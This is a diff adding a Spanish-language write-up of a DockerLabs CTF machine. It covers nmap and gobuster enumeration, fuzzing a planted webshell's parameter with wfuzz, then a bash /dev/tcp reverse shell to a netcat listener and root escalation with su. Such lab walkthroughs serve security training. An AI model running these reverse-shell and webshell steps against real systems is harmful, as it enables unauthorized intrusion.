@@ -1,0 +1,95 @@
+<p><img src="assets/logo-dockerlabs.png" alt="logodocker" w="200" h="200" /></p>
+
+<p>En este reto de <a href="https://dockerlabs.es" title="dockerlabs">DockerLabs</a>  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios y de parametros y por ultimo escalada.</p>
+
+<h2 id="herramientas-y-recursos-usados">Herramientas y recursos usados</h2>
+
+<ul>
+  <li>nmap</li>
+  <li>wfuzz</li>
+</ul>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<p>Empezamos lanzando un nmap contra el objetivo .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-vvv</span> 172.17.0.2 <span class="nt">-oX</span> whereis
+</code></pre></div></div>
+<p><a href="/reporte/whereisnmap.html" title="reportesnmap">Reporte nmap</a></p>
+
+<p>Revisamos la web a ver que encontramos es una web de una academia mientras le miramos el codigo lanzamos gobuster.</p>
+
+<p><img src="assets/whereis/fuenteweb.png" alt="funeteweb" /></p>
+
+<p>Vamos directos a gobuster</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nt">-q</span> <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> html,htm,php,txt,xml <span class="nt">-u</span> http://172.17.0.2/cmsms <span class="nt">--exclude-length</span> 3690
+</code></pre></div></div>
+
+<p><img src="assets/whereis/gobuster.png" alt="gobuster" /></p>
+
+<p>La salida nos arroja varios archivos prometedores ,el warning y lo que be ser una webshell.
+Primero miro el warning por si nos dijera algo , no arroja luz de ningun tipo asi que caragmos shell php y vemos una pagina en blanco, en este punto vamos a fuzzear la palabra que nos falta para poder ejecutar comandos remotos.
+Asi que vamos a fuzzear con wffuz.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">--hl</span><span class="o">=</span>0 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/dict/wordlist-probable.txt <span class="nt">-u</span> <span class="s2">"http://172.17.0.2/shell.php?FUZZ=id"</span>
+</code></pre></div></div>
+
+<p><img src="assets/whereis/fuzzingparametro.png" alt="fuzzingparametro" /></p>
+
+<p>Una vez obtenido el parametro pasamos a probar si podemos ejecutar comandos.</p>
+
+<p><img src="assets/whereis/shellprueba.png" alt="shell" /></p>
+
+<p>Resultado positivo , mandemos una rev shell.
+Ejecutamos lo siguiente pero primero nectact a la escucha.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nc <span class="nt">-lvnp</span> 443
+
+</code></pre></div></div>
+<p>En la webshell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1"</span>
+</code></pre></div></div>
+
+<p>Recepcion</p>
+
+<p><img src="assets/whereis/nc.png" alt="nc" /></p>
+
+<h2 id="escalada">Escalada</h2>
+
+<p>Lo primero una vez reciba la revshell le aplicamos tratamiento.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null <span class="nt">-c</span> bash
+</code></pre></div></div>
+<p>La mandamos al background con control-Z.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
+</code></pre></div></div>
+<p>Si queremos ajustarla al maximo debemos indicarle el numero de lineas y columnas de nuestra terminal .</p>
+
+<blockquote class="prompt-info">
+  <p>Para ver el numero de line y columms de nuestra term ejecutamos respectivamente</p>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">$LINES</span> y <span class="nb">echo</span> <span class="nv">$COLUMMS</span>
+</code></pre></div>  </div>
+</blockquote>
+
+<p>Ya configurada empezamos a mirar con sudo -l y find.
+Ninguno nos devuelve nada y ahi recorde que hemos de acostumbrarnos a mirar hacia atras y recordar todo lo que mos hemos ido encontando en la maquina.
+La memoria me decia que guardaba un secreto en /tmp/ , asi que vamos a mirar que nos dejaron.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp/
+<span class="nb">ls</span> <span class="nt">-la</span>
+</code></pre></div></div>
+
+<p><img src="assets/whereis/secret.png" alt="secret" /></p>
+
+<p>La puso facil esta vez.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su 
+</code></pre></div></div>
+
+<p><img src="assets/whereis/root.png" alt="root" /></p>
+
+<p>Saludos y muchas gracias por leer, pueden comentar dudas o si la han resuleto de otra forma debatamos cual metodo es mas eficaz.</p>
+
